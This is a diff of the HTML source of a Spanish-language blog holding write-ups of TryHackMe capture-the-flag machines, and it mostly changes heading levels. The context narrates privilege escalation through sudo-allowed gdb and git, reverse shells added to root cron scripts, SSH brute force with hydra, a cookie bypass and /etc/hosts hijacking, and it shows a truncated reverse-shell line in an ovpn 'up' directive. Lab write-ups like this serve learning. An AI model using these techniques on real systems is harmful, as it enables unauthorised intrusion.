+&lt;/div&gt;&lt;h1 id=&#34;user---www-data&#34;&gt;USER - WWW-DATA&lt;/h1&gt;
 &lt;p&gt;Encontramos la direccion &lt;code&gt;/images&lt;/code&gt; donde se encuentra otra carpeta y tambien nuestra imagen.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200811_235132.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Agregamos una shell a un archivo php y lo subimos, ejecutamos comandos.&lt;/p&gt;
@@ -2094,7 +2094,7 @@ root@upset:~/thm/tartarus#
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_000001.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;En el directorio de &lt;code&gt;d4rckh&lt;/code&gt; encontramos nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_000440.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;user---thirtytwo-&#34;&gt;USER - THIRTYTWO&lt;/h2&gt;
+&lt;h1 id=&#34;user---thirtytwo&#34;&gt;USER - THIRTYTWO&lt;/h1&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos con sudo pero con el usuario thirtytwo para ejecutar el comando &lt;code&gt;/var/www/gdb&lt;/code&gt;, utilizamos &lt;a href=&#34;https://gtfobins.github.io/gtfobins/gdb/&#34;&gt;&lt;strong&gt;gdb&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_000810.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Ejecutamos el comando y logramos obtener una shell con este usario.&lt;/p&gt;
@@ -2107,7 +2107,7 @@ root@upset:~/thm/tartarus#
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_000903.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;user---d4rckh-&#34;&gt;USER - d4rckh&lt;/h2&gt;
+&lt;h1 id=&#34;user---d4rckh&#34;&gt;USER - d4rckh&lt;/h1&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos con sudo pero con el usuario d4rckh para ejecutar el comando &lt;code&gt;git&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_001032.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Además en la carpeta principal de thirtytwo encontramos una nota donde habla de git.&lt;br /&gt;
@@ -2124,7 +2124,7 @@ root@upset:~/thm/tartarus#
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_001219.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;En la carpeta principal de d4rckh encontramos un script de python que elimina todo lo que esté en &lt;code&gt;/home/cleanup/&lt;/code&gt;. Además este mismo script es ejecutado por el usuario root en un cron.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/tartarus/Screenshot_20200812_002039.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -2210,7 +2210,7 @@ root@upset:~/thm/tartarus#
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -2237,7 +2237,7 @@ root@upset:~/thm/tartarus#
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80), ssh (6498) y http (65524) abierto.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2295,10 +2295,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Aug  5 01:46:30 2020 -- 1 IP address (1 host up) scanned in 15.45 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154228.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h3&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2373,7 +2373,7 @@ GET     &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK                       
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;En una de las paginas encontradas vemos base64, el cual contiene una flag.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154520.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;http-65524-&#34;&gt;HTTP 65524&lt;/h2&gt;
+&lt;h1 id=&#34;http-65524&#34;&gt;HTTP 65524&lt;/h1&gt;
 &lt;p&gt;Encontramos la pagina de apache en el puerto 65524.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154340.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Encontramos en el codigo fuente una flag.&lt;br /&gt;
@@ -2445,12 +2445,12 @@ C^
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154823.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Nuevamente con &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; logramos obtener el texto.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154847.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;boring---user-&#34;&gt;BORING - USER&lt;/h2&gt;
+&lt;h1 id=&#34;boring---user&#34;&gt;BORING - USER&lt;/h1&gt;
 &lt;p&gt;Con las credenciales que encontramos ingresamos por medio del servicio SSH de la maquina en el puerto 6498.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154919.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Encontramos nuestra flag &lt;code&gt;user.txt&lt;/code&gt; la cual esta &amp;lsquo;rotada&amp;rsquo;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_154949.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;cat /etc/crontab&lt;/code&gt; y vemos cron que se ejecuta con el usuario root y que ejecuta el archivo &lt;code&gt;.mysecretcronjob.sh&lt;/code&gt; en &lt;code&gt;/var/www/&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/easypeasy_thm/Screenshot_20200805_155016.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;El archivo no contiene ningun comando por lo que agregamos una shell inversa al archivo.&lt;br /&gt;
@@ -2514,7 +2514,7 @@ C^
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -2541,7 +2541,7 @@ C^
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2571,7 +2571,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Wed Jul 29 19:16:41 2020 -- 1 IP address (1 host up) scanned in 72.59 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_181801.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h2 id=&#34;rustbuster-&#34;&gt;RUSTBUSTER&lt;/h2&gt;
@@ -2664,7 +2664,7 @@ GET     &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden                
 C^
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;latex---exploit-&#34;&gt;LaTeX - EXPLOIT&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;latex---exploit&#34;&gt;LaTeX - EXPLOIT&lt;/h1&gt;
 &lt;p&gt;En la pagina encontramos &lt;code&gt;pdfTeX&lt;/code&gt; para generar PDF a partir de un template y texto ingresado, ingresamos un texto cualquiera y nos devuelve la direccion en donde se encuentra el PDF. Además la version de &lt;code&gt;pdfTeX Version 3.14159265-2.6-1.40.16&lt;/code&gt;&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_182529.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;En la direccion, el PDF con el texto ingresado.&lt;br /&gt;
@@ -2735,8 +2735,8 @@ C^
 g9bmi7WpLL/+UMWNYMetCj52lDgLyisn9B+0/W0/Tfd7qn5SLILAVrMICIYIfVWWsELCTIYTuLEpdo+HVAfxfh8RB3pZ3cG+uzCe1xSMcx0JfSld1Hfa3hJK75zVWwcfu4EvVZ1ghlZwtm7Ls=
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;king---user-&#34;&gt;KING - USER&lt;/h2&gt;
-&lt;h3 id=&#34;apk-&#34;&gt;APK&lt;/h3&gt;
+&lt;/div&gt;&lt;h1 id=&#34;king---user&#34;&gt;KING - USER&lt;/h1&gt;
+&lt;h2 id=&#34;apk&#34;&gt;APK&lt;/h2&gt;
 &lt;p&gt;Encontramos un apk en &lt;code&gt;/Google-Earth/&lt;/code&gt; y utilizamos &lt;a href=&#34;https://github.com/skylot/jadx&#34;&gt;&lt;code&gt;jadx&lt;/code&gt;&lt;/a&gt; para leer el codigo fuente de la aplicacion, en donde encontramos funciones para encriptar y desencriptar, además encontramos el IV y KEY.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_202131.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Utilizamos &lt;a href=&#34;https://gchq.github.io/CyberChef/&#34;&gt;&lt;strong&gt;CyberChef&lt;/strong&gt;&lt;/a&gt; para desencriptar el texto (eliminamos AES/CBC/128).&lt;br /&gt;
@@ -2747,7 +2747,7 @@ g9bmi7WpLL/+UMWNYMetCj52lDgLyisn9B+0/W0/Tfd7qn5SLILAVrMICIYIfVWWsELCTIYTuLEpdo+H
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_202959.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Logramos obtener una shell con el usuario King.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_203111.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;pspy&lt;/code&gt; y encontramos que se ejecuta un cron, el problema es de que no sabemos cual es el contenido de dicho archivo (&lt;code&gt;run.sh&lt;/code&gt;).&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/laxctf/Screenshot_20200729_204315.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;En el directorio principal de &lt;code&gt;king&lt;/code&gt; encontramos un archivo &lt;code&gt;ovpn&lt;/code&gt; por lo que agregamos una shell inversa al igual que en &lt;a href=&#34;https://sckull.github.io/posts/vault/&#34;&gt;&lt;strong&gt;VAULT - HTB&lt;/strong&gt;&lt;/a&gt; esperando a alguna conexion a nuestra maquina.&lt;/p&gt;
@@ -2842,7 +2842,7 @@ up &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -2869,7 +2869,7 @@ up &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;bash -i &amp;gt
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2901,7 +2901,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Jul 17 00:48:28 2020 -- 1 IP address (1 host up) scanned in 37.10 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;ftp-&#34;&gt;FTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;ftp&#34;&gt;FTP&lt;/h1&gt;
 &lt;p&gt;Intentamos ingresar con credenciales de anonymous en el servicio de FTP pero nos muestra un mensaje de error.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2925,10 +2925,10 @@ ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 &lt;span class=&#34;m&#34;&gt;421&lt;/span&gt; Service not available, remote server has closed connection
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80, en el codigo fuente encontramos un mensaje que menciona el usuario &lt;code&gt;steve&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/Screenshot_20200716_235236.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h3&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2940,7 +2940,7 @@ ftp&amp;gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 /index.html &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Status: 200&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;steve---user-&#34;&gt;STEVE - USER&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;steve---user&#34;&gt;STEVE - USER&lt;/h1&gt;
 &lt;p&gt;Utilizamos hydra para hacer un ataque de fuerza bruta en el servicio ssh con el usuario &lt;code&gt;steve&lt;/code&gt; y el wordlist &lt;code&gt;rockyou.txt&lt;/code&gt;.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -2980,7 +2980,7 @@ Hydra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://github.com/vanhauser-t
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Ingresamos por SSH, obtenemos una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/Screenshot_20200717_004637.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Utilizamos &lt;code&gt;pspy64&lt;/code&gt; para ver los cronjobs que se encuentran en la maquina, encontramos que se ejecuta el archivo &lt;code&gt;/opt/minecraft/backup.sh&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/joystick/Screenshot_20200717_011404.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Agregamos una shell inversa al archivo y ponemos a la escucha netcat en nuestra maquina.&lt;br /&gt;
@@ -3040,7 +3040,7 @@ Hydra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://github.com/vanhauser-t
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -3067,7 +3067,7 @@ Hydra &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;https://github.com/vanhauser-t
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;p&gt;Escaneo de puertos tcp, nmap nos muestra el puerto http (80) y el puerto ssh (22) abiertos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -3097,10 +3097,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Fri Jul 17 16:59:17 2020 -- 1 IP address (1 host up) scanned in 37.41 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;Encontramos una pagina web en el puerto 80.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_160249.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h3 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h3&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -3174,14 +3174,14 @@ Service detection performed. Please report any incorrect results at https://nmap
 
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;james---user-&#34;&gt;JAMES - USER&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;james---user&#34;&gt;JAMES - USER&lt;/h1&gt;
 &lt;p&gt;En este caso no hay un control encuanto a las cookies por lo que podemos establecer una cookie cualquiera o vacia y logramos ver lo que esta restringido, utilizamos burpsuite para establecer la cookie en vacio y logramos ver el contenido, en donde nos muestra una clave privada encriptada y el nombre de un usuario (&lt;code&gt;james&lt;/code&gt;).&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_184824.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Utilizamos &lt;code&gt;ssh2john&lt;/code&gt; para obtener el hash y john para obtener la frase del archivo.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_185045.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Utilizamos la frase y la clave, logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_191307.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;privilege-escalation-&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
+&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
 &lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;cat /etc/crontab&lt;/code&gt; y encontramos un cronjob del usuario root, en el que descarga un archivo bash y lo ejecuta en la direccion &lt;code&gt;overpass.thm&lt;/code&gt;.&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpass/Screenshot_20200717_210849.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;Editamos el archivo &lt;code&gt;/etc/hosts&lt;/code&gt; y agregamos nuestra ip en lugar de la de &lt;code&gt;overpass.thm&lt;/code&gt;.&lt;br /&gt;
@@ -3235,7 +3235,7 @@ Service detection performed. Please report any incorrect results at https://nmap
     &lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/cover.webp&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
   &lt;/div&gt;
 
-&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
+&lt;h1 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h1&gt;
 &lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
@@ -3262,7 +3262,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;/tr&gt;
 &lt;/tbody&gt;
 &lt;/table&gt;
-&lt;h2 id=&#34;nmap-&#34;&gt;NMAP&lt;/h2&gt;
+&lt;h1 id=&#34;nmap&#34;&gt;NMAP&lt;/h1&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
 &lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
@@ -3293,10 +3293,10 @@ Service detection performed. Please report any incorrect results at https://nmap
 &lt;span class=&#34;c1&#34;&gt;# Nmap done at Tue May 12 17:20:04 2020 -- 1 IP address (1 host up) scanned in 86.52 seconds&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;h2 id=&#34;http-&#34;&gt;HTTP&lt;/h2&gt;
+&lt;/div&gt;&lt;h1 id=&#34;http&#34;&gt;HTTP&lt;/h1&gt;
 &lt;p&gt;En el puerto 80 encontramos una pagina en la que vemos una pagina sencilla&lt;br /&gt;
 &lt;img src=&#34;https://sckull.github.io/images/posts/thm/racetrackbank/Screenshot_20200512_162323.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
-&lt;h2 id=&#34;gobuster-&#34;&gt;GOBUSTER&lt;/h2&gt;
+&lt;h2 id=&#34;gobuster&#34;&gt;GOBUSTER&lt;/h2&gt;
 &lt;p&gt;Utilizamos gobuster para busqueda de directorios y archivos.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
 &lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
@@ -3337,7 +3337,7 @@ Service detection performed. Please report any incorrect results at https://nmap
